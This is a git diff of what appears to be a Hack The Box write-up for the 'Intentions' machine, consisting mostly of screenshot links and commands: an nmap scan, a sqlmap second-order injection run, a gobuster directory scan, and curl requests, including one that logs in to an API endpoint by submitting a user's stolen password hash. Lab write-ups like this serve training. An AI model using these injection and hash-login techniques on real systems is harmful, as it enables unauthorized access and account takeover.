@@ -1,4 +1,4 @@
-![image](https://github.com/regarmulia/HTB/assets/33616880/de453151-e79c-4960-817b-7aa1ce25a82e)```
+![image](https://github.com/regarmulia/HTB/assets/33616880/854153bd-398f-49c3-8909-4e20537ab35b)```
 nmap -sS -sC -sV -T5 -Pn 10.10.11.220
 ```
 ![image](https://github.com/regarmulia/HTB/assets/33616880/528dff0c-5310-4215-a2d5-7be40b47e7bd)
@@ -49,6 +49,24 @@ sqlmap -r req1b.txt --second-req=req2b.txt --batch --tamper=space2comment -T use
 ```
 gobuster dir -w /usr/share/seclists/Discovery/Web-Content/big.txt -e -t 100 -u http://intentions.htb/api/v2/auth/ -b 403,404
 ```
-![Uploading image.png…]()
+![image](https://github.com/regarmulia/HTB/assets/33616880/a8a78134-9bdc-4b0b-9bcd-75725f2578f4)
+
+
+```
+http://10.10.11.220/api/v2/auth/login
+curl -X POST http://intentions.htb/api/v2/auth/login
+curl -X POST http://intentions.htb/api/v1/auth/login
+```
+![image](https://github.com/regarmulia/HTB/assets/33616880/94443e9d-fda1-424e-aa75-2bc33dbccf6e)
+
+![image](https://github.com/regarmulia/HTB/assets/33616880/91adcde2-ab47-4d10-8890-016e7d0e6534)
+
+
+```
+curl -d 'email=steve@intentions.htb&hash=$2y$10$M/g27T1kJcOpYOfPqQlI3.YfdLIwr3EWbzWOLfpoTtjpeMqpp4twa' -X POST http://intentions.htb/api/v2/auth/login
+```
+![image](https://github.com/regarmulia/HTB/assets/33616880/a740f795-07cd-49c5-b0fa-4cba7ec0a070)
+
+![image](https://github.com/regarmulia/HTB/assets/33616880/50514396-8dea-43e8-8654-ee351d81958b)
 
 
